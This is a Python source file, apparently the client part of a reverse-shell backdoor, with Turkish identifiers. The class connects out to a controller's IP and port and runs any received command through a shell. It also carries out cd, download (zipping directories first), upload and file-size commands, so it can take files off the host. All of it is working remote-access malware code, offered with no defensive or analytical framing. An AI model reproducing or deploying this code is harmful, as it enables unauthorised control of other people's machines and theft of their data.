import socket
import subprocess
import shutil
import os
import ft_fonksiyonlar
class Dinleyici:

    def __init__(self, ip ,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.fonk = ft_fonksiyonlar.fonksiyonlar(self.connection)

       
    def command_run(self, command):

        if isinstance(command, list):
            if command[0] == "cd":
                m= self.fonk.execute_cd_command(command[1])
                return m

            if command[0] == "download":
                if os.path.isdir(command[1]):                                             
                    return [self.fonk.read_file_contents(command[1]+".zip"),command[1]+".zip"]                    
                return self.fonk.read_file_contents(command[1])  
            if command[0]== "boyut":
                
                if os.path.exists(command[1]):
                    if os.path.isdir(command[1]):                        
                        shutil.make_archive(command[1],"zip",command[1])                        
                        return  self.fonk.get_file_size(command[1]+".zip")
                    else:
                        
                        file_size = os.path.getsize(command[1])
                        return bytes(str(file_size),"utf-8")
                                        
            if command[0] == "upload":
                return self.fonk.save_file_for_upload(command[1],command[2])

        else:    
            return subprocess.check_output(command, shell=True)           

       
    def start(self):
        i=0
        while True:
            command = self.fonk.json_receive()
            
            if command == "quit":
                    self.connection.close()
                    exit()

            command = self.fonk.check_command(command)
                
            output = self.command_run(command)
                        
            if isinstance(output,list):
               pass            
            else:
                output = output.decode("latin5") 
                
            self.fonk.json_send(output)  
        self.connection.close()